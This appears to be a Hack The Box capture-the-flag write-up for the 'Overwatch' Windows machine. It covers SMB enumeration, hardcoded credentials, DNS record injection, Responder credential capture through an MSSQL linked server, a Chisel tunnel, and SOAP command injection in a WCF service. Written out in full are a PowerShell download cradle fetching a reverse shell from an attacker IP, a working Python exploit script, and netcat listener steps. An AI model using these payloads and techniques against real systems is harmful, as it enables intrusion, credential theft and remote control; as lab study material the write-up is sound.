# Overwatch

**Target IP:** `10.XXX.X.XXX`
**Domain:** `overwatch.htb`
**Attacker IP:** `10.10.XX.XX`

## 1. Enumeration & Reconnaissance

### 1.1 Port Scan

We begin with a full TCP port scan to identify exposed services.

```bash
nmap -p- --min-rate 10000 10.XXX.X.XXX -oN nmap_all_ports

```


[Nmap Results](https://raw.githubusercontent.com/0x0z0n/Research/refs/heads/main/posts/Browsed/nmap_results.nmap "Results")


![Exploit.zip](htb_Browsed__Mindmap.png))

**Key Discovery:**

* **Standard Ports:** 53 (DNS), 88 (Kerberos), 445 (SMB), 5985 (WinRM).
* **Non-Standard Port:** Port **6520** is open (MSSQL).

![Overwatch](htb_Overwatch_hosts.png)

### 1.2 SMB Enumeration

We enumerate the `software` share found during scanning.

```bash
smbclient //overwatch.htb/software$ -N

```

![Overwatch](htb_Overwatch_smbshares.png)

**Findings:**
Inside the `Monitoring` folder, we identify a .NET application or configuration file.

![Overwatch](htb_Overwatch_smbsoftware_monitoring.png)


* **Action:** We download the files and perform static analysis (using `dnSpy` or `strings`).
* **Result:** We discover hardcoded credentials for the user `sqlsvc`.

![Overwatch](htb_Overwatch_smbsoftware_monitoring_overwatchexe.png)


**Credentials Found:**

* **User:** `OVERWATCH\sqlsvc`
* **Password:** `TI0LKXXXXXXXXX`

![Overwatch](htb_Overwatch_sqlsvcpassword.png)


## 2. Foothold: The DNS & Linked Server Attack

### 2.1 The Concept

We have credentials for `sqlsvc`. We suspect the MSSQL server has a **Linked Server** configured (likely named `SQL07` based on your hints) that it tries to authenticate to.
If we can trick the server into thinking *our* machine is `SQL07`, the MSSQL service account (`sqlmgmt` or similar) will try to authenticate to us, revealing its credentials.

### 2.2 Manipulating DNS

We need to add a DNS entry for `sql07.overwatch.htb` pointing to our attacker IP (`10.10.XX.XX`). We use `dnstool.py` for this, authenticating as `sqlsvc`.

![Overwatch](htb_Overwatch_sQL07exists.png)


```bash
# Syntax: dnstool.py -u user -p pass -r record_name -d data_ip --action add target_ip
python3 dnstool.py -u 'sqlsvc' -p 'TI0LKXXXXXXXXX' -r sql07 -d 10.10.XX.XX --action add 10.XXX.X.XXX

```

By default, authenticated users in AD often have the permission to *add* new DNS records (unless strict ACLs are set).

![Overwatch](htb_Overwatch_new_record_added.png)

Now, anyone inside the network pinging `sql07` will go to `10.10.XX.XX`.
> 
> 

### 2.3 Capturing Credentials (Responder)

Now we set up a trap to capture the authentication attempt.

**1. Start Responder:**
Run Responder on your VPN interface (`tun0`) to listen for SMB/SQL authentication.

```bash
sudo responder -I tun0

```

**2. Trigger the Connection (MSSQL):**
Log in to the MSSQL instance as `sqlsvc` and force a query to the "linked server" `SQL07`.

**Login:**

```bash
impacket-mssqlclient 'OVERWATCH/sqlsvc:TI0LKXXXXXXXXX@10.XXX.X.XXX' -port 6520 -windows-auth

```

**Trigger Command (inside SQL shell):**
This command tells the server to execute a harmless query on `sql07`.

```sql
SQL> EXEC('SELECT 1') AT [SQL07];

```

![Overwatch](htb_Overwatch_SQLMGMT_Pass.png)


**3. The Capture:**
Because of our DNS poisoning, the server connects to *us* (Responder). You should see the NTLMv2 hash or cleartext credentials appear in your Responder window.

**Captured Credentials:**
| User | Password | Source |
| :-- | : | : |
| `sqlmgmt` | `bIhBbXXXXXXXXX` | Captured via Linked Server Auth |

## 3. Initial Access (User Flag)

### 3.1 Remote Management (WinRM)

We verified port **5985** was open earlier. We now use the captured `sqlmgmt` credentials to log in.

```bash
evil-winrm -i 10.XXX.X.XXX -u sqlmgmt -p 'bIhBbXXXXXXXXX'
```




### 3.2 Retrieving the User Flag

Navigate to the user's desktop.

```powershell
*Evil-WinRM* PS C:\Users\sqlmgmt\Documents> cd ..\Desktop
*Evil-WinRM* PS C:\Users\sqlmgmt\Desktop> type user.txt
```

![Overwatch](htb_Overwatch_User_flag.png)



## 4. Privilege Escalation: WCF Service Exploitation

### 4.1 Internal Reconnaissance

After gaining initial access as `sqlmgmt`, we performed internal enumeration to identify potential escalation vectors. We checked for listening ports that were not accessible from the outside.

```powershell
netstat -ano | findstr LISTENING
```

**Findings:**

* We observed a service listening on **TCP Port 8000** bound to `127.0.0.1` (localhost).
* Checking the file system, we found a folder `C:\Software\Monitoring` containing a custom .NET application (`MonitorService.exe`).

> Developers often bind administrative or sensitive services to `localhost` assuming this makes them secure because they cannot be reached from the external network. However, once an attacker has a foothold on the machine (like we do with `sqlmgmt`), they can access these services locally or tunnel them out.

### 4.2 Tunneling (Chisel)

To analyze and exploit this service from our attacking machine (Kali), we established a **SOCKS tunnel** or a **Port Forward** using Chisel. This forwards traffic from our Kali port 8000 directly to the target's localhost:8000.

**1. Start Chisel Server (Kali):**

```bash
./chisel server -p 8001 --reverse
```

**2. Connect Client (Target):**

```powershell
.\chisel.exe client 10.10.XX.XX:8001 R:8000:127.0.0.1:8000
```


> Chisel wraps TCP traffic inside HTTP/WebSocket connections. This is highly effective at bypassing firewalls that might block raw TCP connections but allow outbound web traffic (Port 80/443).

![Overwatch](htb_Overwatch_chinesl_tunnel.png)


### 4.3 Vulnerability Analysis

The service is a **WCF (Windows Communication Foundation)** application. By analyzing the source code (using `dnSpy` if we downloaded the binary) or sending basic requests, we identified a SOAP endpoint at `/MonitorService`.

![Overwatch](htb_Overwatch_monitoring_service.png)


**The Flaw:**
The service exposes a method called `KillProcess`. It accepts a user-supplied string `processName` and likely executes a system command similar to:
`System.Diagnostics.Process.Start("taskkill /IM " + processName);`

Because the input is not sanitized, we can inject a **Command Separator** (`;`) to terminate the intended command and execute our own.

### 4.4 The Exploit Payload

We constructed a payload that chains a benign command (`notepad`) with a malicious download cradle.

**Payload Breakdown:**

```powershell
notepad; IEX(New-Object Net.WebClient).DownloadString('http://10.10.XX.XX/shell.ps1');#

```

1. `notepad` : Satisfies the original command's syntax.
2. `;` : The PowerShell command separator. It tells the system "Finish the previous command, then run this one."
3. `IEX (...)` : "Invoke-Expression". It downloads our reverse shell script from our python server into memory and executes it immediately.
4. `#` : A comment character. It ignores the rest of the original command (like closing quotes) to prevent syntax errors.

![Overwatch](htb_Overwatch_Foged_POC_exploit.png)


### 4.5 Exploit Script (`exploit.py`)

WCF services are strict about XML formatting and Headers. We wrote a Python script to handle the SOAP envelope correctly.

```python
import requests

# 1. Target Configuration
# We target 127.0.0.1 because Chisel is forwarding this port to the victim.
target_url = "http://127.0.0.1:8000/MonitorService"
callback_ip = "10.10.XX.XX"

# 2. The Injection Payload
process_name = f"notepad; IEX(New-Object Net.WebClient).DownloadString('http://{callback_ip}/shell.ps1');#"

# 3. WCF SOAP Envelope
# We must match the XML structure expected by the service contract.
soap_payload = f"""<s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/">
    <s:Body>
        <KillProcess xmlns="http://tempuri.org/">
            <processName>{process_name}</processName>
        </KillProcess>
    </s:Body>
</s:Envelope>"""

# 4. Headers
# The SOAPAction header is CRITICAL. It tells the server exactly which function to run.
headers = {
    "Content-Type": "text/xml; charset=utf-8",
    "SOAPAction": '"http://tempuri.org/IMonitoringService/KillProcess"'
}

try:
    print(f"[*] Sending exploit to {target_url}...")
    response = requests.post(target_url, data=soap_payload, headers=headers, timeout=10)
    print("[+] Server Response:")
    print(response.text)
except Exception as e:
    print(f"[-] Error: {e}")
```

### 4.6 Execution & Root Flag

**Step 1: Start Listener**
Set up a Netcat listener to catch the SYSTEM shell.

```bash
nc -lvnp 4444
```

**Step 2: Host Payload**
Host the `shell.ps1` script (containing a standard PowerShell reverse shell) on port 80.

```bash
python3 -m http.server 80

```

**Step 3: Fire Exploit**
Run the Python script.

```bash
python3 exploit.py

```

**Step 4: Confirm Access**
Check the listener. We should receive a connection from the user running the service (SYSTEM).

```text
connect to [10.10.XX.XX] from (UNKNOWN) [10.XXX.X.XXX] 50461
PS C:\Software\Monitoring> whoami
nt authority\system
```

**Step 5: Capture Root Flag**
Navigate to the Administrator's desktop.

```powershell
PS C:\Software\Monitoring> cd C:\Users\Administrator\Desktop
PS C:\Users\Administrator\Desktop> type root.txt
[ROOT_FLAG_HASH]
```

![Overwatch](htb_Overwatch_Root_flag.png)

![Overwatch](htb_Overwatch_C2_Agent_persistence.png)

![Overwatch](htb_Overwatch_C2_Agent_persistence_ada.png)

![Overwatch](htb_Overwatch_logs_downloader.png)

![Overwatch](htb_Overwatch_C2_Agent_persistence2.png)

![Overwatch](htb_Overwatch_Logs_to_sofelk.png)

![Overwatch](htb_Overwatch_evtxWildcard.png)

![Overwatch](htb_Overwatch_sof_elk_cidec_issue.png)

![Overwatch](htb_Overwatch_evtx_json.png)

![Overwatch](htb_Overwatch_transfer.png)

![Overwatch](htb_Overwatch_dependency_evtx_json.png)

